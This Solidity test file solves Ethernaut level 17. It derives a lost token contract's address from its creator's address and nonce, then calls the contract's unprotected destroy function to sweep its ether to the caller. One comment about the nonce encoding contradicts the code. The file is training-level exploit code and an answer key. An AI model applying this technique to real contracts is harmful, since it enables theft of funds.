// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level17Token {
    function destroy(address payable _to) external;
}

contract Level17Test is EthernautTest {
    function testLevel17() public {
        // Create the level instance, sending 0.001 ether to the level
        _createLevel("17", 0.001 ether);

        // We need to calculate the token address
        // For a standard CREATE, this is keccak256(rlp([sender,nonce]))[12:]
        // RLP([deployer, 0]) = 0xd6 0x94 <addr> 0x80
        bytes memory rlp = bytes.concat(
            hex"d694", // list prefix 0xd6 + addr prefix 0x94
            abi.encodePacked(levelInstance["17"]),
            hex"01" // nonce 1 for a contract creating a contract
        );
        // The token address is the last 20 bytes of the hash of the RLP encoding
        address tokenAddress = address(uint160(uint256(keccak256(rlp))));
        // Selfdestruct the token contract, sending any funds to ourselves
        Level17Token(tokenAddress).destroy(payable(address(this)));

        require(_submitLevel("17"));
    }
}
